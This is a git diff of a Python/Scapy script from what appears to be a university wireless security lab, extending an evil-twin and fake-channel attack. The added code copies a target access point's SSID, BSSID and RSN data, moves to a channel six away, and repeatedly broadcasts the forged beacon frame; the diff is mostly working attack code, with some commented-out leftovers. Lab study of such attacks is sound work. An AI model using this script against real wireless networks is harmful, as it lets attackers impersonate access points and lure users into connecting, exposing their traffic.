@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 # SWI - Labo1-MAC1
 # Date: 02.03.2020
 # File: evil-twin-fake-channel.py
@@ -6,8 +8,7 @@
 # Sources: - https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
 #          - https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy
 #          - https://github.com/Esser420/EvilTwinFramework
-
-# -*- coding: utf-8 -*-
+#          - https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
 
 # Evil twin and fake channel attack
 from scapy.all import *
@@ -49,15 +50,48 @@ try:
 
     print("You choose " + str(target_pkt.info))
 
+    print("Packet Summary " + str(target_pkt.summary()))
+
     # We retrieve the target channel
     target_channel = target_pkt[Dot11Beacon].network_stats().get("channel")
     print("Target channel: " + str(target_channel))
 
-    # We create a new beacon 6 channels away from the target
-    new_ch = (target_channel + 6) % 14
+    # We define a new channel for the beacons
+    if(target_channel > 7):
+        new_ch = target_channel -6
+    else:
+        new_ch = target_channel + 6
+
+    print("New Channel " + str(new_ch))
 
     os.system(f"iwconfig {interface} channel {new_ch}")
+
+    # We forge a new beacon
+    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=target_pkt.addr2, addr3=target_pkt.addr2)
+
+    beacon = Dot11Beacon(cap='ESS+privacy')
+    essid = Dot11Elt(ID=target_pkt.info,info=target_pkt.info, len=len(target_pkt.info))
+    # rsn = Dot11Elt(ID='RSNinfo', info=)               #RSN Capabilities (no extra capabilities)
+    
+    # frame = RadioTap()/dot11/beacon/essid/rsn
+    #if TCP in target_pkt:
+    #    payload = bytes(target_pkt[TCP].payload)
+    #elif Raw in target_pkt:
+    #    payload = bytes(target_pkt[Raw].load)
+    #elif TLS in p:
+    #    payload = bytes(target_pkt[TLS].msg)
+    #else:
+    #    payload = ""
+
+    frame = RadioTap()/dot11/beacon/essid/target_pkt[Dot11EltRSN]
+    
+    print("\nShow frame:")
+    frame.show()
+    #print("\nHexdump of frame:")
+    #hexdump(bytes(frame))
+    input("\nPress enter to send\n")
+    
+    send(frame,count=5, iface=interface, inter=0.1, loop=1)
     
 except Exception as ex:
     print(ex)
-    pass
